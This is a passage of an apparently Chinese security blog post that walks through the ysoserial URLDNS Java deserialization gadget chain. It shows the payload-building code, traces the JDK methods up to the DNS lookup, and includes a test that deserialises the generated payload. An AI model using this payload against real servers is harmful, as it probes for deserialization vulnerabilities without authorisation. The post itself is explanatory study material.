+</span><span class="c1"></span>                <span class="n">ht</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">u</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span> <span class="c1">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+</span><span class="c1"></span>
+                <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">u</span><span class="o">,</span> <span class="s">&#34;hashCode&#34;</span><span class="o">,</span> <span class="o">-</span><span class="n">1</span><span class="o">);</span> <span class="c1">// During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+</span><span class="c1"></span>
+                <span class="k">return</span> <span class="n">ht</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+                <span class="n">PayloadRunner</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="n">URLDNS</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
+        <span class="o">}</span>
+
+        <span class="cm">/**
+</span><span class="cm">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
+</span><span class="cm">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
+</span><span class="cm">         * using the serialized object.&lt;/p&gt;
+</span><span class="cm">         *
+</span><span class="cm">         * &lt;b&gt;Potential false negative:&lt;/b&gt;
+</span><span class="cm">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
+</span><span class="cm">         * second resolution.&lt;/p&gt;
+</span><span class="cm">         */</span>
+        <span class="kd">static</span> <span class="kd">class</span> <span class="nc">SilentURLStreamHandler</span> <span class="kd">extends</span> <span class="n">URLStreamHandler</span> <span class="o">{</span>
+
+                <span class="kd">protected</span> <span class="n">URLConnection</span> <span class="nf">openConnection</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+                <span class="o">}</span>
+
+                <span class="kd">protected</span> <span class="kd">synchronized</span> <span class="n">InetAddress</span> <span class="nf">getHostAddress</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+                <span class="o">}</span>
+        <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到代码注释里写了gadget</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"> *   Gadget Chain:
+ *     HashMap.readObject()
+ *       HashMap.putVal()
+ *         HashMap.hash()
+ *           URL.hashCode()
+</code></pre></td></tr></table>
+</div>
+</div><p>他是从HashMap的readObject开始的，我们跟进去这里看看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">s</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+        <span class="c1">// Read in the threshold (ignored), loadfactor, and any hidden stuff
+</span><span class="c1"></span>        <span class="n">s</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>
+        <span class="n">reinitialize</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">loadFactor</span> <span class="o">&lt;=</span> <span class="n">0</span> <span class="o">||</span> <span class="n">Float</span><span class="o">.</span><span class="na">isNaN</span><span class="o">(</span><span class="n">loadFactor</span><span class="o">))</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidObjectException</span><span class="o">(</span><span class="s">&#34;Illegal load factor: &#34;</span> <span class="o">+</span>
+                                             <span class="n">loadFactor</span><span class="o">);</span>
+        <span class="n">s</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>                <span class="c1">// Read and ignore number of buckets
+</span><span class="c1"></span>        <span class="kt">int</span> <span class="n">mappings</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span> <span class="c1">// Read number of mappings (size)
+</span><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">mappings</span> <span class="o">&lt;</span> <span class="n">0</span><span class="o">)</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidObjectException</span><span class="o">(</span><span class="s">&#34;Illegal mappings count: &#34;</span> <span class="o">+</span>
+                                             <span class="n">mappings</span><span class="o">);</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">mappings</span> <span class="o">&gt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span> <span class="c1">// (if zero, use defaults)
+</span><span class="c1"></span>            <span class="c1">// Size the table using given load factor only if within
+</span><span class="c1"></span>            <span class="c1">// range of 0.25...4.0
+</span><span class="c1"></span>            <span class="kt">float</span> <span class="n">lf</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="na">min</span><span class="o">(</span><span class="n">Math</span><span class="o">.</span><span class="na">max</span><span class="o">(</span><span class="n">0</span><span class="o">.</span><span class="na">25f</span><span class="o">,</span> <span class="n">loadFactor</span><span class="o">),</span> <span class="n">4</span><span class="o">.</span><span class="na">0f</span><span class="o">);</span>
+            <span class="kt">float</span> <span class="n">fc</span> <span class="o">=</span> <span class="o">(</span><span class="kt">float</span><span class="o">)</span><span class="n">mappings</span> <span class="o">/</span> <span class="n">lf</span> <span class="o">+</span> <span class="n">1</span><span class="o">.</span><span class="na">0f</span><span class="o">;</span>
+            <span class="kt">int</span> <span class="n">cap</span> <span class="o">=</span> <span class="o">((</span><span class="n">fc</span> <span class="o">&lt;</span> <span class="n">DEFAULT_INITIAL_CAPACITY</span><span class="o">)</span> <span class="o">?</span>
+                       <span class="n">DEFAULT_INITIAL_CAPACITY</span> <span class="o">:</span>
+                       <span class="o">(</span><span class="n">fc</span> <span class="o">&gt;=</span> <span class="n">MAXIMUM_CAPACITY</span><span class="o">)</span> <span class="o">?</span>
+                       <span class="n">MAXIMUM_CAPACITY</span> <span class="o">:</span>
+                       <span class="n">tableSizeFor</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span><span class="n">fc</span><span class="o">));</span>
+            <span class="kt">float</span> <span class="n">ft</span> <span class="o">=</span> <span class="o">(</span><span class="kt">float</span><span class="o">)</span><span class="n">cap</span> <span class="o">*</span> <span class="n">lf</span><span class="o">;</span>
+            <span class="n">threshold</span> <span class="o">=</span> <span class="o">((</span><span class="n">cap</span> <span class="o">&lt;</span> <span class="n">MAXIMUM_CAPACITY</span> <span class="o">&amp;&amp;</span> <span class="n">ft</span> <span class="o">&lt;</span> <span class="n">MAXIMUM_CAPACITY</span><span class="o">)</span> <span class="o">?</span>
+                         <span class="o">(</span><span class="kt">int</span><span class="o">)</span><span class="n">ft</span> <span class="o">:</span> <span class="n">Integer</span><span class="o">.</span><span class="na">MAX_VALUE</span><span class="o">);</span>
+
+            <span class="c1">// Check Map.Entry[].class since it&#39;s the nearest public type to
+</span><span class="c1"></span>            <span class="c1">// what we&#39;re actually creating.
+</span><span class="c1"></span>            <span class="n">SharedSecrets</span><span class="o">.</span><span class="na">getJavaOISAccess</span><span class="o">().</span><span class="na">checkArray</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">cap</span><span class="o">);</span>
+            <span class="nd">@SuppressWarnings</span><span class="o">({</span><span class="s">&#34;rawtypes&#34;</span><span class="o">,</span><span class="s">&#34;unchecked&#34;</span><span class="o">})</span>
+            <span class="n">Node</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;[]</span> <span class="n">tab</span> <span class="o">=</span> <span class="o">(</span><span class="n">Node</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;[])</span><span class="k">new</span> <span class="n">Node</span><span class="o">[</span><span class="n">cap</span><span class="o">];</span>
+            <span class="n">table</span> <span class="o">=</span> <span class="n">tab</span><span class="o">;</span>
+
+            <span class="c1">// Read the keys and values, and put the mappings in the HashMap
+</span><span class="c1"></span>            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">mappings</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+                <span class="nd">@SuppressWarnings</span><span class="o">(</span><span class="s">&#34;unchecked&#34;</span><span class="o">)</span>
+                    <span class="n">K</span> <span class="n">key</span> <span class="o">=</span> <span class="o">(</span><span class="n">K</span><span class="o">)</span> <span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                <span class="nd">@SuppressWarnings</span><span class="o">(</span><span class="s">&#34;unchecked&#34;</span><span class="o">)</span>
+                    <span class="n">V</span> <span class="n">value</span> <span class="o">=</span> <span class="o">(</span><span class="n">V</span><span class="o">)</span> <span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                <span class="n">putVal</span><span class="o">(</span><span class="n">hash</span><span class="o">(</span><span class="n">key</span><span class="o">),</span> <span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>gadget说到了，接下来是<code>putVal() -&gt; hash()</code>，我们再跟进hash方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java">    <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="nf">hash</span><span class="o">(</span><span class="n">Object</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">h</span><span class="o">;</span>
+        <span class="k">return</span> <span class="o">(</span><span class="n">key</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">?</span> <span class="n">0</span> <span class="o">:</span> <span class="o">(</span><span class="n">h</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="na">hashCode</span><span class="o">())</span> <span class="o">^</span> <span class="o">(</span><span class="n">h</span> <span class="o">&gt;&gt;&gt;</span> <span class="n">16</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里执行了一个<code>key.hashCode()</code>，这个key是一个对象，我们再回去看到gedget，最后是<code>URL.hashCode()</code>，是URL执行了hashCode()</p>
+<p>我们回去跟进URL，可以发现这里如果hashCode为-1的时候，他会重新计算hashCode，这时候就执行了一个<code>handler.hashCode(this)</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">synchronized</span> <span class="kt">int</span> <span class="nf">hashCode</span><span class="o">()</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">hashCode</span> <span class="o">!=</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span>
+        <span class="k">return</span> <span class="n">hashCode</span><span class="o">;</span>
+
+    <span class="n">hashCode</span> <span class="o">=</span> <span class="n">handler</span><span class="o">.</span><span class="na">hashCode</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+    <span class="k">return</span> <span class="n">hashCode</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>handler跟一下发现是：<code>transient URLStreamHandler handler;</code>，是<code>URLStreamHandler</code>类的对象</p>
+<p>我们再去跟进这个<code>hashCode()</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">protected</span> <span class="kt">int</span> <span class="nf">hashCode</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="o">{</span>
+    <span class="kt">int</span> <span class="n">h</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
+
+    <span class="c1">// Generate the protocol part.
+</span><span class="c1"></span>    <span class="n">String</span> <span class="n">protocol</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getProtocol</span><span class="o">();</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">protocol</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+        <span class="n">h</span> <span class="o">+=</span> <span class="n">protocol</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>
+
+    <span class="c1">// Generate the host part.
+</span><span class="c1"></span>    <span class="n">InetAddress</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">getHostAddress</span><span class="o">(</span><span class="n">u</span><span class="o">);</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">addr</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">h</span> <span class="o">+=</span> <span class="n">addr</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">host</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getHost</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">host</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+            <span class="n">h</span> <span class="o">+=</span> <span class="n">host</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">hashCode</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="c1">// Generate the file part.
+</span><span class="c1"></span>    <span class="n">String</span> <span class="n">file</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getFile</span><span class="o">();</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">file</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+        <span class="n">h</span> <span class="o">+=</span> <span class="n">file</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>
+
+    <span class="c1">// Generate the port part.
+</span><span class="c1"></span>    <span class="k">if</span> <span class="o">(</span><span class="n">u</span><span class="o">.</span><span class="na">getPort</span><span class="o">()</span> <span class="o">==</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span>
+        <span class="n">h</span> <span class="o">+=</span> <span class="n">getDefaultPort</span><span class="o">();</span>
+    <span class="k">else</span>
+        <span class="n">h</span> <span class="o">+=</span> <span class="n">u</span><span class="o">.</span><span class="na">getPort</span><span class="o">();</span>
+
+    <span class="c1">// Generate the ref part.
+</span><span class="c1"></span>    <span class="n">String</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getRef</span><span class="o">();</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">ref</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+        <span class="n">h</span> <span class="o">+=</span> <span class="n">ref</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>
+
+    <span class="k">return</span> <span class="n">h</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>看到了一个很敏感的方法<code>getHostAddress(u);</code>，我们继续跟进这个方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">protected</span> <span class="kd">synchronized</span> <span class="n">InetAddress</span> <span class="nf">getHostAddress</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">u</span><span class="o">.</span><span class="na">hostAddress</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+            <span class="k">return</span> <span class="n">u</span><span class="o">.</span><span class="na">hostAddress</span><span class="o">;</span>
+
+        <span class="n">String</span> <span class="n">host</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getHost</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">host</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">host</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;&#34;</span><span class="o">))</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">u</span><span class="o">.</span><span class="na">hostAddress</span> <span class="o">=</span> <span class="n">InetAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">(</span><span class="n">host</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">UnknownHostException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SecurityException</span> <span class="n">se</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">u</span><span class="o">.</span><span class="na">hostAddress</span><span class="o">;</span>
+    <span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里执行了一个<code>InetAddress.getByName(host);</code>，他的作用就是根据主机名去获取IP地址，也就会发送一次DNS请求</p>
+<p>那么我们现在要怎么去让他执行到URL的<code>hashCode</code>，这里看到yoserial是这样的做的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">URLStreamHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SilentURLStreamHandler</span><span class="o">();</span>
+<span class="n">HashMap</span> <span class="n">ht</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span> <span class="c1">// HashMap that will contain the URL
+</span><span class="c1"></span><span class="n">URL</span> <span class="n">u</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">url</span><span class="o">,</span> <span class="n">handler</span><span class="o">);</span> <span class="c1">// URL to use as the Key
+</span><span class="c1"></span><span class="n">ht</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">u</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>调用了一个<code>ht.put(u, url);</code>，跟进一看，这里刚好就有个方法完美的连接上了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">public V put(K key, V value) {
+		return putVal(hash(key), key, value, false, true);
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>到这里，整个利用链就算跟完了</p>
+<p>写个demo来测试一下payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">org.junit.Test</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">demo</span> <span class="o">{</span>
+
+    <span class="nd">@Test</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">test</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+        <span class="n">ObjectInputStream</span> <span class="n">o</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">&#34;xxx/payload.out&#34;</span><span class="o">));</span>
+        <span class="n">o</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://tuchuang.huamang.xyz/img/image-20220929121152066.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220929121152066"
+	
+	
+></p>
+<p>最后附上思维导图</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220929115739946.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220929115739946"
+	
+	
+></p>
+<p>参考文章：</p>
+<p>《Java安全漫谈》</p>
+<p><a class="link" href="https://redmango.top/article/34"  target="_blank" rel="noopener"
+    >https://redmango.top/article/34</a></p>
+<p><a class="link" href="https://ego00.blog.csdn.net/article/details/119678492"  target="_blank" rel="noopener"
+    >https://ego00.blog.csdn.net/article/details/119678492</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/rome/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[Java安全] ROME链分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/jdk7u21/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[Java安全] Jdk7u21链分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/cc7/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[Java安全] CommonsCollections7链分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/shiro2/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[Java安全] CommonsBeanutils1在Shiro中的利用</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/cb1/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[Java安全] CommonsBeanutils1利用链分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 Huamang
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        <span id="busuanzi_container_page_pv"> 阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span>
+        <br>
+        
+        <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
